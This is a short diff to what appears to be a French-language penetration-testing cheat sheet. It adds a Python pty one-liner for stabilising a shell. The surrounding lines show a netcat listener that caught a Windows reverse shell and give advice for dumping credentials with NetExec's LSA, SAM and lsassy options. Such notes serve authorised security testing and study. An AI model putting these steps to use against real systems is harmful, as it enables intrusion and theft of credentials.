@@ -38,6 +38,10 @@ listening on [any] 4444 ...
 ...
 C:\Windows\system32>
 ``` 
+### Shell stable 
+```python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 ### Dumps creds 
 ```bash
 Avec nxc toujours faire --local-host --lsa --sam puis après faire un -M lsassy
